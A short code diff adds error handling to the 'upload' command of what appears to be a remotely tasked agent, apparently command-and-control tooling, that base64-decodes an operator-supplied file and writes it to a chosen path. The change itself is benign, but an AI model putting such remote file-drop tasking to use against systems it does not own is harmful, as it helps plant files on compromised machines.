@@ -281,10 +281,23 @@ namespace Athena.Commands
                 case "upload":
                     var uploadTask = Task.Run(() =>
                     {
-                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                        Console.WriteLine(par["path"]);
-                        Console.WriteLine(par["file"]);
-                        FileHandler.uploadFile(par["path"], Misc.Base64DecodeToByteArray(par["file"]));
+                        try
+                        {
+                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                            Console.WriteLine(par["path"]);
+                            Console.WriteLine(par["file"]);
+                            job.taskresult = FileHandler.uploadFile(par["path"], Misc.Base64DecodeToByteArray(par["file"]));
+                            job.hasoutput = true;
+                            job.complete = true;
+                        }
+                        catch (Exception e)
+                        {
+                            job.taskresult = e.Message;
+                            job.complete = true;
+                            job.hasoutput = true;
+                            job.errored = true;
+                        }
+
                     });
                     break;
                 default:
